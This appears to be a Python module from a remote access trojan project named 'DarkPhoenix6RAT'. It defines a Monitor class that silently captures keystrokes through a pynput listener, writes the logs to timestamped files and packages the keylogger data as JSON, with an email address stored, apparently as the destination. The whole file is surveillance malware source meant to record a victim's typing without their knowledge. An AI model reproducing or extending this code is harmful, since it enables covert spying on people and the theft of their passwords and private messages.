import datetime
import json
from pynput import keyboard
from SystemDetection.system_detection import SystemInformation
from DarkPhoenix6RAT.InputDetection.keylogger import KeyLogger
MISSING = object()


class Monitor(object):

    def __init__(self, email):
        self.email = email
        self.key_logger = KeyLogger()
        self.system_information = SystemInformation()

    def silent_monitor_keys(self):
        with keyboard.Listener(
                on_press=self.key_logger.on_press_silent,
                on_release=self.key_logger.on_release_silent) as listener:
            listener.join()

    @staticmethod
    def save_log(filename, log, directiory=MISSING):
        date_string = datetime.datetime.now().strftime("%Y-%m-%d-%H:%M")
        if directiory != MISSING:
            with open(directiory + filename + "-" + date_string, 'a') as f:
                f.writelines(log)

    def to_json(self):
        """ Converts all member data into a JSON string
        :return: JSON string
        """
        data = {
            "KeyLogger": self.key_logger.to_json(),

        }
        return json.dumps(data)
